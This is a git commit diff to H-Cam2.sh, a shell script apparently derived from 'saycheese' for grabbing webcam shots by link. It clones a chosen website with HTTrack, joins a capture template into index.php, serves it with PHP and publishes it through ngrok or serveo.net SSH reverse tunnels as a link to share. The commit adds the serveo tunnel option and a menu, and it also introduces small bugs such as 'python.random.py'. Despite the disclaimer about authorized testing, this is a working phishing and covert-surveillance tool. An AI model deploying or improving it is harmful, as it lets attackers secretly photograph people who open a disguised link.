b60969dc247554a0a5a4d51738b6e77d410e2f53
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2020-05-16 13:29:08 +0530

    Add files via upload

--- H-Cam2.sh
+++ H-Cam2.sh
@@ -9,7 +9,7 @@ fl() {
 	}
 	ch() {
 		fl
-		if [ -e curl ] || [ -e php ] || [ -e figlet ] || [ -e ssh ] || [ -e httrack ];then
+		if [ -e curl ] || [ -e php ] || [ -e figlet ] || [ -e ssh ] || [ httrack ];then
 		echo
 		else
 		printf "\n\n\033[1;91m Please install curl , php , figlet . openssh and httrack\n\n"
@@ -17,9 +17,12 @@ fl() {
 		fi
 		}
 		ch
+		check() {
+			pwd > /dev/null 2>&1
+			}
 R() {
 	cd ~/H-Cam2
-	python .random.py
+	python.random.py
 	}
 banner() {
 R
@@ -29,7 +32,7 @@ printf "\n"
 printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"                              
 printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
 printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/thelinuxchoice/saycheese          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]		        Edited by Maruf		    	\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]		        Edited by Maruf		      	\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\n"
 printf "\n"
 printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
 printf "         testing in an authorized simulated cyberattack\n"
@@ -166,7 +169,7 @@ sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
 cd ~/H-Cam2
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 13
+sleep 15
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
@@ -174,7 +177,7 @@ if [[ -z $link ]];then
 printf "\e[1;91m[!] Ngrok error, Not work\n"
 exit 1
 fi
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\n\n\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n\n" $link
 
 }
 
@@ -205,8 +208,9 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
 if [[ ! -d websites/ ]]; then
 mkdir websites
 fi
-
+check
 httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
+check
 payload
 ngrok_server
 checkfound
@@ -242,6 +246,197 @@ fi
 
 }
 
+start2() {
+
+if [[ ! -d images/ ]]; then
+mkdir images
+fi
+
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Open website\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Open Html file\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
+
+command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
+default_website_mirror="https://www.google.com"
+printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
+read website_mirror
+website_mirror="${website_mirror:-${default_website_mirror}}"
+printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
+if [[ ! -d websites/ ]]; then
+mkdir websites
+fi
+check
+httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
+check
+payload
+serveo-link
+checkfound
+
+
+elif [[ $option_server -eq 2 ]]; then
+default_website_template="H-Cam2.html"
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
+website_template="${website_template:-${default_website_template}}"
+if [[ -f $website_template ]]; then
+
+if [[ $website_template == *'index.php'* ]]; then
+printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
+exit 1
+fi
+
+cat $website_template > index.php
+cat template.html >> index.php
+serveo-link
+checkfound
+
+else
+printf "\e[91m[!] File not found\n"
+exit 1
+fi
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start
+fi
+
+}
+
+start3() {
+
+if [[ ! -d images/ ]]; then
+mkdir images
+fi
+
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Open website\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Open Html file\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
+
+command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
+default_website_mirror="https://www.google.com"
+printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
+read website_mirror
+website_mirror="${website_mirror:-${default_website_mirror}}"
+printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
+if [[ ! -d websites/ ]]; then
+mkdir websites
+fi
+check
+httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
+check
+payload
+serveo-link
+ngrok_server
+checkfound
+
+
+elif [[ $option_server -eq 2 ]]; then
+default_website_template="H-Cam2.html"
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
+website_template="${website_template:-${default_website_template}}"
+if [[ -f $website_template ]]; then
+
+if [[ $website_template == *'index.php'* ]]; then
+printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
+exit 1
+fi
+
+cat $website_template > index.php
+cat template.html >> index.php
+serveo-link
+ngrok_server
+checkfound
+
+else
+printf "\e[91m[!] File not found\n"
+exit 1
+fi
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start
+fi
+
+}
+
+
+
+serveo-link() {
+
+default_choose_sub="Y"
+default_subdomain="hcam2$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+payload
+server
+
+}
+server() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]\033[1;92m Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n\n' $send_link
+
+}
+ngrok-start () {
+	start
+	}
+	serveo-start () {
+		start2
+		}
+		serveo-ngrok() {
+			start3
+			}
+
+
 
 payload() {
 
@@ -252,9 +447,25 @@ cat websites/$index_file > index.php
 cat template.html >> index.php
 fi
 }
+men() {
+	printf "\033[93m[\033[0m1\033[93m]\033[1;92m Serveo \n"
+	printf "\033[93m[\033[0m2\033[93m]\033[1;92m Ngrok \n"
+	printf "\033[93m[\033[0m3\033[93m]\033[1;92m Serveo and Ngrok \n\n"
+	echo -e -n "\033[1;96m Select : \033[0m"
+	read a
+	if [ $a -eq 1 ];then
+	serveo-start
+	elif [ $a -eq 2 ];then
+	ngrok-start
+	elif [ $a -eq 3 ];then
+	serveo-ngrok
+	else
+	printf "invalid "
+	fi
+	}
+	
 
 
 banner
 dependencies
-start
-
+men
